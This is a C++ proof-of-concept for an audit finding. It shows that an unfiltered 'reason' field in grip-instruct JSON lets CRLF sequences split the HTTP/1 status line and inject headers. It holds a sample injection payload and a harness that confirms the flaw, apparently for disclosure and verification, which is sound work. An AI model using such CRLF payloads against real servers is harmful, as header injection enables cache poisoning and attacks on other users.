// PoC for finding 023: src/handler/instruct.cpp:568.
//
// Inside an application/grip-instruct JSON, Instruct::fromResponse reads
// `response.reason` via getString and assigns it to newResponse.reason
// without rejecting CR or LF (line 567-568 unpatched). The reason then
// reaches the HTTP/1 status-line writer at
// src/core/http1/protocol.rs:987 which does:
//
//     write!(writer, "{} {}\r\n", code, reason)?;
//
// Embedded CRLF in the reason terminates the status line and emits
// attacker-controlled header lines before the legitimate ones.

#include <cstdio>
#include <string>
#include <utility>
#include <vector>

using Header = std::pair<std::string, std::string>;
using Headers = std::vector<Header>;

struct Response {
    int code = 200;
    std::string reason = "OK";
    Headers headers;
    std::string body;
};

// Mirrors src/handler/instruct.cpp:560-568 (unpatched).
//   QString reasonStr = getString(in, pn, "reason", false, &ok_, errorMessage);
//   ...
//   if (!reasonStr.isEmpty())
//       newResponse.reason = reasonStr.toUtf8();
static void applyInstructReason(Response *r, const std::string &reasonStr) {
    if (!reasonStr.empty())
        r->reason = reasonStr;
}

// Mirrors src/core/http1/protocol.rs:981-1001.
static std::string serializeHttp1(const Response &r) {
    std::string out = "HTTP/1.1 " + std::to_string(r.code) + " " + r.reason + "\r\n";
    for (const auto &h : r.headers)
        out += h.first + ": " + h.second + "\r\n";
    out += "\r\n";
    out += r.body;
    return out;
}

static std::string escape(const std::string &s) {
    std::string o;
    for (char c : s) {
        switch (c) {
        case '\r': o += "\\r"; break;
        case '\n': o += "\\n"; break;
        default:   o += c;
        }
    }
    return o;
}

int main() {
    // Backend-supplied grip-instruct JSON; reason carries CRLF + a header.
    const std::string jsonPayload =
        "{\n"
        "  \"response\": {\n"
        "    \"code\": 200,\n"
        "    \"reason\": \"OK\\r\\nX-Injected: yes\",\n"
        "    \"body\": \"hello\"\n"
        "  }\n"
        "}\n";

    std::printf("=== Attacker grip-instruct JSON ===\n%s\n", jsonPayload.c_str());

    // The string Instruct::fromResponse extracts after JSON unescaping.
    const std::string reasonStr = std::string("OK\r\nX-Injected: yes");

    Response r;
    r.body = "hello";
    applyInstructReason(&r, reasonStr);

    std::string wire = serializeHttp1(r);

    std::printf("=== Resulting HTTP/1 bytes (escaped) ===\n%s\n",
                escape(wire).c_str());
    std::printf("=== Resulting HTTP/1 bytes (raw) ===\n%s\n", wire.c_str());

    bool injected = wire.find("HTTP/1.1 200 OK\r\nX-Injected: yes\r\n") != std::string::npos;

    if (injected) {
        std::puts("RESULT: vulnerable. CRLF inside the JSON response.reason terminated");
        std::puts("        the status line and injected an attacker-controlled header.");
        return 0;
    }

    std::puts("RESULT: did not reproduce");
    return 1;
}
